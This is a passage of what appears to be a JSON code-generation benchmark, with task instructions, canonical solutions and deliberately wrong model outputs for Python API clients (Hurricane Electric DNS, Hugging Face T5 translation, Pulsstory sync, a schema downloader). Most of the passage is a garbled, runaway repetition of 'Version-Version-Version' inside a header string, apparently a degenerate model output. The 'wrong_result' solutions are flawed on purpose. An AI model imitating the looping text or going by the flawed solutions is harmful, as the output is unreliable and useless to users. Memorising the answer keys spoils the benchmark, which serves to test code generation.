self.object.client_device_protocol_encryption_algorithm_name_version_name_version_name_version_name_version_version_version_version_version_version_version_version_version_version_version_version_version_version_version_version_version_version,\n            'X-Plex-Client-Device-Protocol-Encryption-Algorithm-Name-Version-Name-Version-Name-Version-Name-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version-Version"
  },
  {
    "Task_id": 11,
    "Instruction": "Task Description: Implement a Python class to interact with Hurricane Electric's dynamic DNS API for updating DNS records programmatically.\n\nClass Description: HurricaneElectricAPI is a client class that handles communication with Hurricane Electric's DNS service to update DNS records. It supports both direct connections and proxy connections.\n\nAttributes:\n- SITE: [str] - The target domain for the Hurricane Electric API (dyn.dns.he.net)\n- METHOD: [str] - The HTTP method to use for requests (POST)\n- ACTION: [str] - The API endpoint path (nic/update)\n- TOKEN_PARAM: [str] - The parameter name for the authentication token (password)\n- TOKEN: [str] - The authentication token/password for API access\n- PROXY: [str/None] - Optional proxy server address\n\nMethods:\n- __init__(token=\"password\", proxy=None) -> None - Initializes the API client with optional token and proxy settings\n- _request(param=None, **params) -> str - Internal method to make HTTP requests to the API\n- update_record(domain, value, record_type=\"A\") -> str - Updates a DNS record with the given value\n\nMethod Details:\n1. _request(param=None, **params) -> str\n   - Makes an HTTPS request to the Hurricane Electric API\n   - Input:\n     - param: [dict/None] - Optional base parameters\n     - **params: Additional request parameters\n   - Output: [str] - API response string\n   - Raises Exception on HTTP errors or API failures\n\n2. update_record(domain, value, record_type=\"A\") -> str\n   - Updates a DNS record with the specified value\n   - Input:\n     - domain: [str] - The domain name to update\n     - value: [str] - The new IP address or value\n     - record_type: [str] - The DNS record type (default: \"A\")\n   - Output: [str] - Human-readable status message about the update\n   - Raises Exception if the update fails",
    "Canonical_solution": "from http.client import HTTPSConnection\nfrom urllib.parse import urlencode\nfrom logging import info, debug, warning\n\nclass HurricaneElectricAPI:\n    def __init__(self, token=\"password\", proxy=None):\n        self.SITE = \"dyn.dns.he.net\"\n        self.METHOD = \"POST\"\n        self.ACTION = \"nic/update\"\n        self.TOKEN_PARAM = \"password\"\n        self.TOKEN = token\n        self.PROXY = proxy\n\n    def _request(self, param=None, **params):\n        if param:\n            params.update(param)\n\n        params.update({self.TOKEN_PARAM: '***'})\n        info(\"%s/%s : %s\", self.SITE, self.ACTION, params)\n        params[self.TOKEN_PARAM] = self.TOKEN\n\n        if self.PROXY:\n            conn = HTTPSConnection(self.PROXY)\n            conn.set_tunnel(self.SITE, 443)\n        else:\n            conn = HTTPSConnection(self.SITE)\n\n        conn.request(self.METHOD, '/' + self.ACTION, urlencode(params), {\n            \"Content-type\": \"application/x-www-form-urlencoded\"\n        })\n        response = conn.getresponse()\n        res = response.read().decode('utf8')\n        conn.close()\n\n        if response.status < 200 or response.status >= 300:\n            warning('%s : error[%d]:%s', self.ACTION, response.status, res)\n            raise Exception(res)\n        else:\n            debug('%s : result:%s', self.ACTION, res)\n            if not res:\n                raise Exception(\"empty response\")\n            elif res[:5] == \"nochg\" or res[:4] == \"good\":\n                return res\n            else:\n                raise Exception(res)\n\n    def update_record(self, domain, value, record_type=\"A\"):\n        info(\">>>>>%s(%s)\", domain, record_type)\n        res = self._request(hostname=domain, myip=value)\n        if res[:4] == \"good\":\n            result = \"Record updated. New IP is: \" + res[5:-1]\n        elif res[:5] == \"nochg\":\n            result = \"IP not changed. IP is: \" + res[6:-1]\n        else:\n            result = \"Record update failed.\"\n        return result",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "```python\nimport requests\nfrom urllib.parse import urlencode\n\nclass HurricaneElectricAPI:\n    SITE = \"dyn.dns.he.net\"\n    METHOD = \"POST\"\n    ACTION = \"nic/update\"\n    TOKEN_PARAM = \"password\"\n    TOKEN = \"password\"\n    PROXY = None\n\n    def __init__(self, token=\"password\", proxy=None):\n        self.TOKEN = token\n        self.PROXY = proxy\n\n    def _request(self, param=None, **params):\n        if param is None:\n            param = {}\n        param.update({\n            \"hostname\": params.get(\"domain\"),\n            \"myip\": params.get(\"value\"),\n            \"type\": params.get(\"record_type\", \"A\"),\n            self.TOKEN_PARAM: self.TOKEN\n        })\n        url = f\"https://{self.SITE}/{self.ACTION}\"\n        headers = {\"Content-Type\": \"application/x-www-form-urlencoded\"}\n        try:\n            response = requests.post(url, data=urlencode(param), headers=headers, proxies={\"https\": self.PROXY})\n            response.raise_for_status()\n        except requests.exceptions.HTTPError as errh:\n            raise Exception(f\"HTTP Error: {errh}\")\n        except requests.exceptions.ConnectionError as errc:\n            raise Exception(f\"Error Connecting: {errc}\")\n        except requests.exceptions.Timeout as errt:\n            raise Exception(f\"Timeout Error: {errt}\")\n        except requests.exceptions.RequestException as err:\n            raise Exception(f\"Something went wrong: {err}\")\n        return response.text\n\n    def update_record(self, domain, value, record_type=\"A\"):\n        response = self._request(domain=domain, value=value, record_type=record_type)\n        if \"good\" in response:\n            return f\"Record for {domain} updated successfully.\"\n        else:\n            raise Exception(f\"Failed to update record for {domain}: {response}\")\n```\n"
  },
  {
    "Task_id": 111,
    "Instruction": "Task Description: Implement a function that translates text using the Hugging Face T5-base model API, handling HTTP requests and responses appropriately.\n\nFunction Description: The function `translate_text` sends a text input to the Hugging Face T5-base model API for translation. It handles the HTTP POST request, checks the response status, and returns either the translated text or an error message. The function uses the `requests` library for HTTP communication and requires an access token for authorization.\n\nInput:\n- `ctx: Context` - The context object for sending responses.\n- `sender: str` - The identifier of the sender to whom the response will be sent.\n- `input_text: str` - The text to be translated.\n\nOutput:\n- The function does not return a value directly but sends a `TranslationResponse` with the translated text if successful, or an `Error` with the error message if the request fails or an exception occurs.",
    "Canonical_solution": "import os\nimport requests\nfrom messages.t5_base import TranslationRequest, TranslationResponse, Error\n\nHUGGING_FACE_ACCESS_TOKEN = os.getenv(\n    \"HUGGING_FACE_ACCESS_TOKEN\", \"HUGGING_FACE_ACCESS_TOKEN\")\nT5_BASE_URL = \"https://api-inference.huggingface.co/models/t5-base\"\nHEADERS = {\n    \"Authorization\": f\"Bearer {HUGGING_FACE_ACCESS_TOKEN}\"\n}\n\nasync def translate_text(ctx: Context, sender: str, input_text: str):\n    payload = {\n        \"inputs\": input_text\n    }\n    try:\n        response = requests.post(T5_BASE_URL, headers=HEADERS, json=payload)\n        if response.status_code == 200:\n            await ctx.send(sender, TranslationResponse(translated_text=f\"{response.json()}\"))\n            return\n        else:\n            await ctx.send(sender, Error(error=f\"Error: {response.json()}\"))\n            return\n    except Exception as ex:\n        await ctx.send(sender, Error(error=f\"Exception Occurred: {ex}\"))\n        return",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport requests\nfrom context import Context\nfrom translation_response import TranslationResponse\nfrom error import Error\n\ndef translate_text(ctx: Context, sender: str, input_text: str) -> None:\n    url = \"https://api-inference.huggingface.co/models/t5-base\"\n    headers = {\"Authorization\": \"Bearer YOUR_ACCESS_TOKEN\"}\n    data = {\"inputs\": input_text}\n\n    try:\n        response = requests.post(url, headers=headers, json=data)\n        response.raise_for_status()\n        translated_text = response.json()[0]['translation_text']\n        ctx.send(TranslationResponse(sender, translated_text))\n    except requests.exceptions.RequestException as e:\n        ctx.send(Error(sender, str(e)))\n```"
  },
  {
    "Task_id": 112,
    "Instruction": "Task Description: Create a Python class that implements an HTTP client for interacting with the Pulsstory ExternalSyncAPI, handling authentication, data retrieval, and activity synchronization.\n\nClass Description: The PulsstoryHTTPClient class provides methods to interact with the Pulsstory API, including user authentication, activity download/upload, and token management. It handles HTTP requests, error responses, and data serialization.\n\nAttributes:\n- URLBase: str - The base URL for all API endpoints\n- PULSSTORY_CLIENT_ID: str - Client ID for API authentication\n- PULSSTORY_CLIENT_SECRET: str - Client secret for API authentication\n\nMethods:\n- _api_request(endpoint: str, service_record: object = None, method: str = \"POST\", data: dict = None, headers: dict = None, files: dict = None) -> dict - Internal method to make API requests and handle responses\n- _apiData(service_record: object) -> dict - Helper method to prepare authentication data\n- get_user_id(service_record: object) -> str - Retrieves user ID from the API\n- get_api_uris(service_record: object) -> dict - Gets API endpoint URIs from the service\n- retrieve_authorization_token(code: str) -> str - Exchanges an authorization code for an access token\n- revoke_authorization(service_record: object) -> None - Revokes an existing authorization\n- download_activity(service_record: object, activity_id: str) -> dict - Downloads activity data\n- upload_activity(service_record: object, upload_data: dict, uris: dict) -> str - Uploads activity data as a compressed file",
    "Canonical_solution": "from tapiriik.settings import PULSSTORY_CLIENT_ID, PULSSTORY_CLIENT_SECRET\nimport requests\nimport urllib.parse\nimport json\n\nclass PulsstoryHTTPClient:\n    def __init__(self, base_url, client_id=None, client_secret=None):\n        self.URLBase = base_url\n        self.PULSSTORY_CLIENT_ID = client_id or PULSSTORY_CLIENT_ID\n        self.PULSSTORY_CLIENT_SECRET = client_secret or PULSSTORY_CLIENT_SECRET\n\n    def _api_request(self, endpoint, service_record=None, method=\"POST\", data=None, headers=None, files=None):\n        url = self.URLBase + endpoint\n        request_data = self._apiData(service_record) if service_record else {}\n        if data:\n            request_data.update(data)\n        \n        if method == \"POST\":\n            response = requests.post(url, data=request_data, headers=headers, files=files)\n        else:\n            raise ValueError(\"Unsupported HTTP method\")\n\n        if response.status_code != 200:\n            if response.status_code in [401, 403]:\n                raise APIException(\"No authorization for request\", block=True, user_exception=UserException(UserExceptionType.Authorization, intervention_required=True))\n            raise APIException(f\"Request failed with status {response.status_code}: {response.text}\")\n\n        return response.json()\n\n    def _apiData(self, service_record):\n        return {\"access_token\": service_record.Authorization[\"Token\"]}\n\n    def get_user_id(self, service_record):\n        return self._api_request(\"/ExternalSyncAPI/GetUserId\", service_record)[\"userID\"]\n\n    def get_api_uris(self, service_record):\n        uris = self._api_request(\"/ExternalSyncAPI/Uris\", service_record)\n        for k in uris.keys():\n            if isinstance(uris[k], str):\n                uris[k] = self.URLBase + uris[k]\n        return uris\n\n    def retrieve_authorization_token(self, code):\n        params = {\n            \"code\": code,\n            \"client_id\": self.PULSSTORY_CLIENT_ID,\n            \"client_secret\": self.PULSSTORY_CLIENT_SECRET\n        }\n        response = requests.post(\n            self.URLBase + \"/ExternalSyncAPI/GenerateToken\",\n            data=urllib.parse.urlencode(params),\n            headers={\"Content-Type\": \"application/x-www-form-urlencoded\"}\n        )\n        if response.status_code != 200:\n            raise APIException(\"Invalid code\")\n        return response.json()[\"access_token\"]\n\n    def revoke_authorization(self, service_record):\n        response = requests.post(self.URLBase + \"/ExternalSyncAPI/Deauthorize\", data=self._apiData(service_record))\n        if response.status_code not in [200, 204]:\n            raise APIException(f\"Unable to deauthorize token, status {response.status_code}\")\n\n    def download_activity(self, service_record, activity_id):\n        return self._api_request(activity_id, service_record)\n\n    def upload_activity(self, service_record, upload_data, uris):\n        json_data = json.dumps(upload_data)\n        buffer = io.BytesIO()\n        with zipfile.ZipFile(buffer, 'w') as myzip:\n            myzip.writestr('activity.txt', json_data, compress_type=zipfile.ZIP_DEFLATED)\n        files = {\"data\": buffer.getvalue()}\n        return self._api_request(uris[\"upload_activity_zip\"], service_record, files=files)[\"Id\"]",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport requests\nimport json\nimport base64\nimport zlib\nimport os\nimport logging\nfrom datetime import datetime, timedelta\n\nclass PulsstoryHTTPClient:\n    URLBase = \"https://api.pulsstory.com\"\n    PULSSTORY_CLIENT_ID = \"your_client_id\"\n    PULSSTORY_CLIENT_SECRET = \"your_client_secret\"\n\n    def _api_request(self, endpoint: str, service_record: object = None, method: str = \"POST\", data: dict = None, headers: dict = None, files: dict = None) -> dict:\n        url = self.URLBase + endpoint\n        if service_record:\n            url += \"?service_record=\" + service_record\n        try:\n            response = requests.request(method, url, data=data, headers=headers, files=files)\n            response.raise_for_status()\n            return response.json()\n        except requests.exceptions.HTTPError as errh:\n            logging.error(\"Http Error:\", errh)\n        except requests.exceptions.ConnectionError as errc:\n            logging.error(\"Error Connecting:\", errc)\n        except requests.exceptions.Timeout as errt:\n            logging.error(\"Timeout Error:\", errt)\n        except requests.exceptions.RequestException as err:\n            logging.error(\"OOps: Something Else\", err)\n\n    def _apiData(self, service_record: object) -> dict:\n        return {\n            \"client_id\": self.PULSSTORY_CLIENT_ID,\n            \"client_secret\": self.PULSSTORY_CLIENT_SECRET,\n            \"service_record\": service_record\n        }\n\n    def get_user_id(self, service_record: object) -> str:\n        data = self._apiData(service_record)\n        response = self._api_request(\"/user_id\", service_record, data=data)\n        return response[\"user_id\"]\n\n    def get_api_uris(self, service_record: object) -> dict:\n        data = self._apiData(service_record)\n        response = self._api_request(\"/api_uris\", service_record, data=data)\n        return response\n\n    def retrieve_authorization_token(self, code: str) -> str:\n        data = {\n            \"client_id\": self.PULSSTORY_CLIENT_ID,\n            \"client_secret\": self.PULSSTORY_CLIENT_SECRET,\n            \"code\": code\n        }\n        response = self._api_request(\"/retrieve_authorization_token\", data=data)\n        return response[\"access_token\"]\n\n    def revoke_authorization(self, service_record: object) -> None:\n        data = self._apiData(service_record)\n        self._api_request(\"/revoke_authorization\", service_record, data=data)\n\n    def download_activity(self, service_record: object, activity_id: str) -> dict:\n        data = self._apiData(service_record)\n        response = self._api_request(\"/download_activity\", service_record, data=data)\n        return response\n\n    def upload_activity(self, service_record: object, upload_data: dict, uris: dict) -> str:\n        data = self._apiData(service_record)\n        data.update(upload_data)\n        files = {\"file\": (\"activity.json\", json.dumps(data))}\n        response = self._api_request(uris[\"upload_activity\"], service_record, method=\"POST\", data=data, files=files)\n        return response[\"activity_id\"]\n```\n"
  },
  {
    "Task_id": 114,
    "Instruction": "Task Description: Write a Python function that downloads a schema file from a given URL and returns its local path. The function should handle cases where the file already exists locally and properly manage HTTP request failures.\n\nFunction Description: The function `download_schema_file` downloads a JSON schema file from a specified URL to a local path. It checks if the file already exists locally before attempting to download. If the download fails, it issues a warning and exits the script. The function uses the `requests` library for HTTP operations and handles file paths using `pathlib.Path`.\n\nInput: \n- `envs` (Dict[str, Any]): A dictionary containing environment variables with the following keys:\n  - `SIGMA_SCHEMA_FILE`: Optional local path for the schema file. If not provided, defaults to \"sigma-schema.json\" in the workspace.\n  - `SIGMA_SCHEMA_URL`: URL from which to download the schema file.\n  - `GITHUB_WORKSPACE`: Base directory path for resolving relative file paths.\n\nOutput: \n- `Path | NoReturn`: Returns the absolute path to the downloaded schema file if successful. If the download fails, the function exits the script with status code -1.",
    "Canonical_solution": "import os\nimport requests\nimport warnings\nfrom pathlib import Path\nfrom typing import Any, Dict, NoReturn\n\ndef download_schema_file(envs: Dict[str, Any]) -> Path | NoReturn:\n    \"\"\"Download the schema file from the given URL and return its path.\n\n    Args:\n        envs (Dict[str, Any]): A dictionary containing the environment variables\n            used by the action.\n\n    Returns:\n        Path | NoReturn: Path to the schema file or exit the script if\n            the file could not be downloaded.\n    \"\"\"\n\n    schema_file = envs[\"SIGMA_SCHEMA_FILE\"]\n    schema_url = envs[\"SIGMA_SCHEMA_URL\"]\n    if not schema_file:\n        schema_file = envs[\"GITHUB_WORKSPACE\"] / \"sigma-schema.json\"\n    else:\n        schema_file = Path(schema_file)\n        if not schema_file.exists():\n            schema_file = envs[\"GITHUB_WORKSPACE\"] / schema_file\n\n    if not schema_file.exists():\n        response = requests.get(schema_url)\n        if response.status_code == 200:\n            with open(schema_file, \"wb\") as f:\n                f.write(response.content)\n        else:\n            warnings.warn(\n                f\"Failed to download schema file {schema_file}, skipping validation\"\n            )\n            os._exit(-1)\n    return (envs[\"GITHUB_WORKSPACE\"] / schema_file).absolute()",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
